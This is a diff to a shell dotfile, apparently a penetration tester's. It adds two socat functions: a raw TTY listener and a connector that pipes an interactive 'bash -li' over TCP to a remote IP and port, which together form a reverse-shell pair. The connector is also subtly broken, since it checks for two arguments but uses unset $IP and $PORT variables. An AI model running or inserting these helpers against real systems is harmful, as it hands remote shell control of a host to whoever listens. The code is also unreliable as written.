@@ -36,6 +36,22 @@ mitm_proxy() {
    docker run --rm -it -v ~/.mitmproxy:/home/mitmproxy/.mitmproxy -p 8080:8080 mitmproxy/mitmproxy
 }
 
+function socat-listen() {
+	if [ "$#" -ne 1 ]; then
+           echo "[-] Usage: ./socat-listen.sh <10000:10050>"
+           return 1
+	fi
+	socat file:`tty`,raw,echo=0 tcp-listen:$1
+}
+
+function socat-connect() {
+	if [ "$#" -ne 2 ]; then
+           echo "[-] Usage: ./socat-connect.sh <IP> <PORT>"
+           return 1
+	fi
+   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:$PORT
+}
+
 alias utc="date -u"
 alias cls="clear"
 alias gs="git status"
